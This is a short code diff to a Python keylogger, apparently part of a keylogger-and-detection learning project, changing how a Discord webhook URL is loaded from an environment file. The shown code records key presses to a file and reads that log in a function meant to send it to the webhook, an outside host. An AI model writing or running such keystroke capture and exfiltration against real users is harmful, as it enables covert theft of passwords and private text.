@@ -2,13 +2,15 @@ import datetime
 import os
 import requests
 from pynput import keyboard
+from dotenv import load_dotenv
 
 # key logging variables including file path to log file
 log_file = "Python/Projects/Keylogger-and-Detection-Script/key_presses.txt"
 keys_pressed = "" 
 
 def send_log_to_discord():
-    webhook = os.environ["WEBHOOK_URL"]
+    load_dotenv()
+    webhook = os.getenv("WEBHOOK_URL")
 
     with open(log_file, "r") as f:
         content = f.read()
